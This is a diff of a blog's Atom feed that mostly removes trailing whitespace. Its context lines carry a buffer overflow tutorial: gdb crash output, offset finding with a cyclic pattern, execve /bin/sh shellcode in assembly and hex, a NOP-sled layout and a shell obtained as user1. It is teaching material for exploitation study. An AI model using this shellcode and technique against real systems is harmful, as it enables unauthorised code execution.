@@ -9,7 +9,7 @@
   </author>
   <icon>https://l1ge.github.io/image/brand/icon-1-1.png</icon>
   <logo>https://l1ge.github.io/image/brand/icon-2-1.png</logo>
-  <updated>2020-05-19T14:39:04Z</updated>
+  <updated>2020-05-19T15:21:00Z</updated>
   <link rel="self" type="application/atom+xml" href="https://l1ge.github.io/feed.atom" hreflang="en-us"/>
   <link rel="alternate" type="text/html" href="https://l1ge.github.io/" hreflang="en-us"/>
   <entry>
@@ -43,7 +43,7 @@ Here's a program that echo's out your input
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 Program received signal SIGSEGV, Segmentation fault.
-0x0000000000400595 in main () 
+0x0000000000400595 in main ()
 </code></pre>
 <p>The last line contain the return address <code>0x0000000000400595</code>. As we can see, there are no '41' so we didn't override it. Let's increase to 155</p>
 <pre><code class="language-bash">(gdb) run $(python -c &quot;print('A'*155)&quot;)
@@ -125,7 +125,7 @@ echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
 <pre><code class="language-bash">gdb-peda$ run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
 </code></pre>
 <p>And automatically search for the pattern in the registers with <code>pattern search</code></p>
-<pre><code class="language-bash">gdb-peda$ pattern search 
+<pre><code class="language-bash">gdb-peda$ pattern search
 
 Registers contain pattern buffer:
 RBP+0 found at offset: 144
@@ -152,7 +152,7 @@ RBP+0 found at offset: 144
     push $0x3c
     pop %eax
     xor %rdi,%rdi
-    syscall 			&lt;------ The last 4 lines are for the exit function. 
+    syscall 			&lt;------ The last 4 lines are for the exit function.
 </code></pre>
 <p>The hex version:</p>
 <pre><code class="language-shell">\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
@@ -214,7 +214,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x7fffffffe248:	0xffffe64d	0x00007fff	0x90909090	0x90909090 &lt;----- Nops start here
 0x7fffffffe258:	0x90909090	0x90909090	0x90909090	0x90909090
 0x7fffffffe268:	0x90909090	0x90909090	0x90909090	0x90909090
-0x7fffffffe278:	0x90909090	0x90909090	0x90909090	0x90909090 
+0x7fffffffe278:	0x90909090	0x90909090	0x90909090	0x90909090
 0x7fffffffe288:	0x90909090	0x90909090	0x90909090	0x90909090
 0x7fffffffe298:	0x90909090	0x90909090	0x90909090	0x90909090 &lt;----- The address I pick
 0x7fffffffe2a8:	0x90909090	0x90909090	0x90909090	0x48583b6a &lt;----- shellcode
@@ -242,12 +242,12 @@ Program received signal SIGSEGV, Segmentation fault.
 
 Here's a program that echo's out your input
 ����������������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j&lt;XH1�AAAAAAAAAAAA�����
-sh-4.2$ 
+sh-4.2$
 </code></pre>
 <p>Yeay ! We're in !</p>
 <pre><code class="language-bash">sh-4.2$ whoami
 user1
-sh-4.2$ cat secret.txt 
+sh-4.2$ cat secret.txt
 cat: secret.txt: Permission denied
 </code></pre>
 <p>Aww...As we can see, we're only user1. And we can't access the secret file. Let's look at the permissions.</p>
